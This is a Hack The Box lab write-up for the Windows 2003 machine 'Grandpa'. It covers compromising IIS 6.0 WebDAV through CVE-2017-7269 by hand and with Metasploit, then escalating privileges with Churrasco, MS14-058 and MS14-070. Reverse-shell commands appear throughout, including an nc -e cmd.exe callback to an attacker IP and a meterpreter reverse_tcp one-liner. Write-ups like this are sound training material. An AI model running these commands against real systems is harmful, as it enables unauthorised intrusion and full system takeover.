> In this writeup I have Grandpa from hackthebox with manual exploit and metasploit exploit. Target was vulnerable with CVE-2017-7269.

### Enumeration
#### rustscan
```bash
rustscan --accessible --ulimit 5000 -a 10.129.179.235 -- -p-
```

_gobuster results_

Target running
- **OS** : Microsoft Windows 2003
`Microsoft-IIS/6.0` with extension of `WebDAV`. Almost all the http methods are allowed.
- There was no write permissions on target web root directory.
- Gobuster didn't gave anything useful. It just gave authenticated redirection.

### Exploitation
Target is vulnerable to [CVE-2017-7269](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7269).
For exploitation we can use exploit code from [this](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269) repository.
Set-up ncat listener and run the exploit like below.
```bash
rlwrap nc -lvnp 1337

# python exploit.py <target_ip> <port> <attacker_ip> <port>
python exploit.py 10.129.179.235 80 10.10.17.81 1337
```
![](/assets/Images-03-Grandpa/2022-01-01-17-31-07.png)
_user shell_
**`And we get a shell with network account privilege.`**

### Post Exploitation
On checking current user privileges we got confirmation we can **`impersonate privileges`**.
```bash
whoami /priv
```
![](/assets/Images-03-Grandpa/2022-01-01-19-15-21.png)
_whoami /priv_

As Token Impersonation is enabled and target is Microsoft Windows 2003. Priv Esc is possible with
[Churrasco](https://github.com/Re4son/Churrasco/). `certutil` was not working properly so binary transfer was done using smbserver.
```bash
sudo smbserver.py a bins # at binary location
```
![](/assets/Images-03-Grandpa/2022-01-01-19-18-52.png)
_file transfer_

**`Churrasco`** also requires `ncat`. So it had to be transferred too.
Before execution nc listener is required at attacker machine end.
```bash
rlwrap nc -lvnp 9001 # attacker machine

churrasco.exe -d ".\nc.exe -e cmd.exe 10.10.17.81 9001" # victim machine
```
**`And we get a shell with highest privilege.`**

_churrasco priv esc_

---

### Exploitation | Metasploit
With previous enumeration we confirmed target was vulnerable with CVE-2017-7269. Searchsploit didn't gave results. So on searching CVE in **`msfconsole`** we got 1 exploit.
```bash
msf6 > search 2017-7269

exploit/windows/iis/iis_webdav_scstoragepathfromurl
```

![](/assets/Images-03-Grandpa/2022-01-01-19-36-43.png)
_searching exploit_

With below one liner we can exploit target with Metasploit module and get meterpreter shell.
```bash
msfconsole -q -x "use exploit/windows/iis/iis_webdav_scstoragepathfromurl; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 4444; set RHOSTS 10.129.180.7; run;"
```
![](/assets/Images-03-Grandpa/2022-01-01-19-35-34.png)
_meterpreter user shell_

### Post Exploitation | Metasploit
`getuid` failed as we got shell with unstable process. We have migrate this to another stable process for further exploitation.
```bash
meterpreter > getuid
[-] 1055: Operation failed: Access is denied.

meterpreter > ps
  ...
meterpreter > migrate 1924
```
After migration now we have stable meterpreter shell with network account privilege.
![](/assets/Images-03-Grandpa/2022-01-01-19-40-19.png)
_process migration_

For priv esc we can use **`local_exploit_suggester`**
![](/assets/Images-03-Grandpa/2022-01-01-19-51-30.png)
_local exploit suggester_

It gave multiple results. Selecting 2nd from top as 1st exploit could not be validated.
Using **`windows/local/ms14_058_track_popup_menu`**
![](/assets/Images-03-Grandpa/2022-01-01-19-54-53.png)
_MS14-058 priv esc_

`getuid` and `ps` didn't worked first time. After running `shell` and after going back to meterpreter it gave expected response.

**`And finally we get a shell with highest privilege.`**
![](/assets/Images-03-Grandpa/2022-01-01-19-55-45.png)
_MS14-058 priv esc_

Priv esc was also successful on trying another exploit **`windows/local/ms14_070_tcpip_ioctl`**
![](/assets/Images-03-Grandpa/2022-01-01-20-26-46.png)
_MS14-070 priv esc_

**`It gave stable shell with highest privilege.`**

#### Failures and Learnings

```bash
searchsploit "Microsoft IIS 6.0"
searchsploit -m "windows/remote/41738.py"
```
Tried to use `Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow | windows/remote/41738.py` as this seemed reliable for moment. But it didn't worked.

![](/assets/Images-03-Grandpa/2022-01-01-20-46-35.png)
_41738 failed_

Using [explodingcan](https://github.com/danigargu/explodingcan)

It didn't worked for `nc shell`. It worked for developer with meterpreter shell but I wanted to avoid meterpreter.
![](/assets/Images-03-Grandpa/2022-01-01-21-04-13.png)
_explodingcan results_


Finally I used [this](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269) repo and it worked.
Even it had 48 stars in github which seems unreliable for this vulnerability.

meterpreter's `getsystem` will not always work even if 
`SeImpersonatePrivilege` is set to true.
